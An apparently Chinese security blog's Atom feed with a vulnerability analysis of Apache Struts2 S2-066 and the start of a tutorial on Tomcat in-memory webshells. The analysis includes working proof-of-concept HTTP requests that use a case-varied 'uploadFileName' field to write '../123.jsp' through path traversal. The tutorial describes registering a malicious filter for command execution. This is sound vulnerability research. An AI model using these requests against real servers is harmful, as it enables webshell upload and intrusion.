<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ki10Moc&#39;s World</title>
  
  
  <link href="https://ki10moc.github.io/atom.xml" rel="self"/>
  
  <link href="https://ki10moc.github.io/"/>
  <updated>2023-12-11T14:46:13.000Z</updated>
  <id>https://ki10moc.github.io/</id>
  
  <author>
    <name>ki10Moc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>S2-066分析</title>
    <link href="https://ki10moc.github.io/2023/12/11/S2-066%E5%88%86%E6%9E%90/"/>
    <id>https://ki10moc.github.io/2023/12/11/S2-066%E5%88%86%E6%9E%90/</id>
    <published>2023-12-11T09:36:36.000Z</published>
    <updated>2023-12-11T14:46:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a class="markdownIt-Anchor" href="#漏洞描述">#</a> 漏洞描述</h2><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211095248309.png" alt="image-20231211095248309"></p><h2 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本">#</a> 影响版本</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.5</span><span class="number">.0</span> &lt;= Struts &lt;= <span class="number">2.5</span><span class="number">.32</span></span><br><span class="line"><span class="number">6.0</span><span class="number">.0</span> &lt;= Struts &lt;= <span class="number">6.3</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><h2 id="修复版本"><a class="markdownIt-Anchor" href="#修复版本">#</a> 修复版本</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Apache Struts2 &gt;= <span class="number">2.5</span><span class="number">.33</span></span><br><span class="line">Apache Struts2 &gt;= <span class="number">6.3</span><span class="number">.0</span><span class="number">.2</span></span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建">#</a> 环境搭建</h2><p>测试版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">6.3</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>百度网盘</p><h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析">#</a> 漏洞分析</h2><p>首先看下官方修复的代码</p><p><a href="https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163">https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163</a></p><p>这里可以看到有几处都讲参数转换为小写，漏洞应该和这个有关系</p><p>我们先上传一个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /S2_066_war_exploded/upload.action HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 248</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;../1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">This is test</span><br><span class="line">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211145549898.png" alt="image-20231211145549898"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211145930148.png" alt="image-20231211145930148"></p><p>打上断点看下流程</p><p>在 org.apache.struts2.interceptor.FileUploadInterceptor#intercept 中</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211151544422.png" alt="image-20231211151544422"></p><p>这里通过 multiWrapper.getFileNames 方法，对 wrapper 封装的 request 对象以及 inputname 来获取到 filename</p><p>通过数组加载进 accept 方法</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211154023490.png" alt="image-20231211154023490"></p><p>然后判断不为空开始遍历 accept，将其加载进参数</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211161357489.png" alt="image-20231211161357489"></p><p>再来看 strut 是如何处理文件名的</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211163356689.png" alt="image-20231211163356689"></p><p>大概理解下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">getCanonicalName</span><span class="params">(<span class="keyword">final</span> String originalFileName)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> originalFileName;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">forwardSlash</span> <span class="operator">=</span> fileName.lastIndexOf(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">backwardSlash</span> <span class="operator">=</span> fileName.lastIndexOf(<span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (forwardSlash != -<span class="number">1</span> &amp;&amp; forwardSlash &gt; backwardSlash) &#123;</span><br><span class="line">            fileName = fileName.substring(forwardSlash + <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fileName = fileName.substring(backwardSlash + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fileName;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>匹配最后一个 / 的位置</p><p>在本例中则为 2，也就是 forwardSlash</p><p>而…/1.txt 中没有 \\</p><p>所以 backwardSlash 为 - 1</p><p>所以 if 条件满足</p><p>执行 fileName = fileName.substring (forwardSlash + 1);</p><p>赋值新的 filename，也就是 / 后面的内容，也就是请求的文件 1.txt</p><p>最终返回</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211164346848.png" alt="image-20231211164346848"></p><p>并 set 存储到上传对象中</p><p>这段代码也就是拦截了路径穿越</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211171719991.png" alt="image-20231211171719991"></p><p>以上上传文件的对象最终会保存到 HttpParameter 参数中</p><p>所以看下是不是可以变量覆盖</p><p>其实刚出的时候看过官方的 commit，看到修改了几个小写</p><p>我想到的就是大小写绕过，但是不可能这么简单，就在想是不是什么地方或者是什么加载器也加载了文件和文件内容，导致文件上传。</p><p>先来看看上下文对象获取的大概流程</p><p>上下文是从 ac.getParameters () 获取的</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211175525092.png" alt="image-20231211175525092"></p><p>一直跟进到 ActionContext 下的 get 方法</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211175927070.png" alt="image-20231211175927070"></p><p>下面就是找上下文的创建，在 org.apache.struts2.dispatcher.Dispatcher#serviceAction</p><p>这里获取上下文是 map 结构存储，key 唯一</p><p>那这里就不太可能存在变量覆盖</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211180829481.png" alt="image-20231211180829481"></p><p>然后再看会不会是参数绑定</p><p>在 com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211195921775.png" alt="image-20231211195921775"></p><p>这里参数绑定会经过三个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">params.entrySet()</span><br><span class="line">parameters.entrySet()</span><br><span class="line">acceptableParameters.entrySet()</span><br></pre></td></tr></table></figure><p>其中 params 和 parameters 都是通过 HttpParamteters 对象加载上传文件和类型，内容</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211201631821.png" alt="image-20231211201631821"></p><p>而 acceptableParameters 是通过 TreeMap 加载的</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211201808865.png" alt="image-20231211201808865"></p><p>但是这个加载是有顺序的</p><p>通过代码测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个TreeMap对象</span></span><br><span class="line">        TreeMap&lt;Object, Object&gt; objectObjectTreeMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向TreeMap中添加两个键值对</span></span><br><span class="line">        objectObjectTreeMap.put(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        objectObjectTreeMap.put(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印TreeMap对象</span></span><br><span class="line">        System.out.println(objectObjectTreeMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211201017453.png" alt="image-20231211201017453"></p><p>可以看到会优先大写的</p><p>这里直接跟着 Y4 爷的步伐。。。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.action HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Content-Length: 188</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------</span></span><br><span class="line"><span class="comment">xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span></span><br><span class="line"><span class="comment">(KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1aaa</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;UPloadFileName&quot;;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment">1323.jsp</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span><br></pre></td></tr></table></figure><p>在 ognl.OgnlRuntime#_getSetMethod 获取 setter ⽅法时调⽤了 ognl.OgnlRuntime#getDeclaredMethods 做处理</p><p>这里了遍历方法名，加载到 set 方法，setUpload</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211213047462.png" alt="image-20231211213047462"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211214207202.png" alt="image-20231211214207202"></p><p>得到值为 1，也就是 public 修饰符</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211213810889.png" alt="image-20231211213810889"></p><p>后去就是 m 的值赋给新的成员变量，到达 result 返回</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211214418882.png" alt="image-20231211214418882"></p><p>最终通过_getSetMethod 返回 method</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211214607186.png" alt="image-20231211214607186"></p><p>中间就都是一些类的处理，不是很重要</p><p>我们直接看 addIfAccessor 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addIfAccessor</span><span class="params">(List result, Method method, String baseName, <span class="type">boolean</span> findSets)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ms</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        <span class="keyword">if</span> (ms.endsWith(baseName)) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isSet</span> <span class="operator">=</span> <span class="literal">false</span>, isIs = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> ((isSet = ms.startsWith(SET_PREFIX)) || ms.startsWith(GET_PREFIX)</span><br><span class="line">                    || (isIs = ms.startsWith(IS_PREFIX))) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">prefixLength</span> <span class="operator">=</span> (isIs ? <span class="number">2</span> : <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">if</span> (isSet == findSets) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (baseName.length() == (ms.length() - prefixLength)) &#123;</span><br><span class="line">                        result.add(method);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>大概梳理下逻辑</p><p>首先检查方法名是否是以’baseName’结尾</p><p>如果是，进一步检查是否以几个前缀开始的</p><p>如果是 is 开头长度为 2，不是则为 3</p><p>如果和要找的设置器响度相等，就比较 ms 方法减去前缀，其实也就是 baseName 的方法名，如果一致，就添加到 result 中</p><p>其中关于 baseName，我们来看下 getDeclaredMethods</p><p>其中这部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">baseName</span> <span class="operator">=</span> capitalizeBeanPropertyName(propertyName);</span><br><span class="line">                    result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">                    collectAccessors(targetClass, baseName, result, findSets);</span><br></pre></td></tr></table></figure><p>经过 capitalizeBeanPropertyName 方法处理后得到 baseName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">first</span> <span class="operator">=</span> propertyName.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">second</span> <span class="operator">=</span> propertyName.charAt(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;</span><br><span class="line">            <span class="keyword">return</span> propertyName;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span>[] chars = propertyName.toCharArray();</span><br><span class="line">            chars[<span class="number">0</span>] = Character.toUpperCase(chars[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>简单描述下就是，如果传过来的 baseName，首字母是小写的，第二个字母是大写的，直接返回</p><p>否则就大写第一个字母返回</p><p>又因为我们要触发的是 com.struts2.UploadAction#setUploadFileName</p><p>其中 baseName 也就是 UploadFileName</p><p>那就只能写成 UploadFileName 或者是 uploadFileName</p><p>poc1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /S2_066_war_exploded/upload.action HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Length: 406</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This is test</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;uploadFileName&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">../123.jsp</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205052719.png" alt="image-20231211205052719"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205122110.png" alt="image-20231211205122110"></p><p>poc2:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /S2_066_war_exploded/upload.action?uploadFileName=../<span class="number">1234.</span>jsp HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Length: 406</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This is test</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205158357.png" alt="image-20231211205158357"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205213052.png" alt="image-20231211205213052"></p><h2 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复">#</a> 漏洞修复</h2><p>看 diff 不难发现官方将传递的参数改为大小写不敏感，<em>检查当前键是否与 nameLowerCase 相等，忽略大小写</em>，这样就会覆盖我们传递的值</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#漏洞描述&quot;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/ki10Moc/img/main/imag</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="Struts2" scheme="https://ki10moc.github.io/tags/Struts2/"/>
    
    <category term="CVE" scheme="https://ki10moc.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>内存马基础学习(一)</title>
    <link href="https://ki10moc.github.io/2023/08/01/%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/"/>
    <id>https://ki10moc.github.io/2023/08/01/%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</id>
    <published>2023-07-31T17:07:08.000Z</published>
    <updated>2024-06-09T05:19:18.079Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="0x01-前言"><a class="markdownIt-Anchor" href="#0x01-前言">#</a> 0x01 前言</h2><p>熟悉一下 Tomcat 框架</p><h2 id="0x02-java-web-三大件"><a class="markdownIt-Anchor" href="#0x02-java-web-三大件">#</a> 0x02 Java web 三大件</h2><p>Servlet，Filter，Listener</p><p>当 Tomcat 接收到请求时候，依次会经过 Listener -&gt; Filter -&gt; Servlet</p><h3 id="servlet"><a class="markdownIt-Anchor" href="#servlet">#</a> Servlet</h3><h4 id="概念"><a class="markdownIt-Anchor" href="#概念">#</a> 概念</h4><p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/ServletLike.png" alt="img"></p><h4 id="请求流程"><a class="markdownIt-Anchor" href="#请求流程">#</a> 请求流程</h4><p>客户端发起一个 http 请求，比如 get 类型。</p><p>Servlet 容器接收到请求，根据请求信息，封装成 HttpServletRequest 和 HttpServletResponse 对象。这步也就是我们的传参。</p><p>Servlet 容器调用 HttpServlet 的 init () 方法，init 方法只在第一次请求的时候被调用。</p><p>Servlet 容器调用 service () 方法。</p><p>service () 方法根据请求类型，这里是 get 类型，分别调用 doGet 或者 doPost 方法，这里调用 doGet 方法。</p><p>doXXX 方法中是我们自己写的业务逻辑。</p><p>业务逻辑处理完成之后，返回给 Servlet 容器，然后容器将结果返回给客户端。</p><p>容器关闭时候，会调用 destory 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 基础恶意类  </span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/servlet&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTest</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="生命周期"><a class="markdownIt-Anchor" href="#生命周期">#</a> 生命周期</h4><blockquote><p>1）服务器启动时 (web.xml 中配置 load-on-startup=1，默认为 0) 或者第一次请求该 servlet 时，就会初始化一个 Servlet 对象，也就是会执行初始化方法 init (ServletConfig conf)。</p><p>2）servlet 对象去处理所有客户端请求，在 service (ServletRequest req，ServletResponse res) 方法中执行</p><p>3）服务器关闭时，销毁这个 servlet 对象，执行 destroy () 方法。</p><p>4）由 JVM 进行垃圾回收。</p></blockquote><h3 id="filter"><a class="markdownIt-Anchor" href="#filter">#</a> Filter</h3><h4 id="概念-2"><a class="markdownIt-Anchor" href="#概念-2">#</a> 概念</h4><blockquote><p>filter 也称之为过滤器，是对 Servlet 技术的一个强补充，其主要功能是在 HttpServletRequest 到达 Servlet 之前，拦截客户的 HttpServletRequest ，根据需要检查 HttpServletRequest，也可以修改 HttpServletRequest 头和数据；在 HttpServletResponse 到达客户端之前，拦截 HttpServletResponse ，根据需要检查 HttpServletResponse，也可以修改 HttpServletResponse 头和数据。</p></blockquote><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/filterWorking.png" alt="img"></p><p>这里如果我们自己创建一个 filter，放在正常流程的 filter 之前，并且将恶意代码注册进去，那就可以达到命令执行效果，也就成为了一个内存 webshell</p><h4 id="基本工作原理"><a class="markdownIt-Anchor" 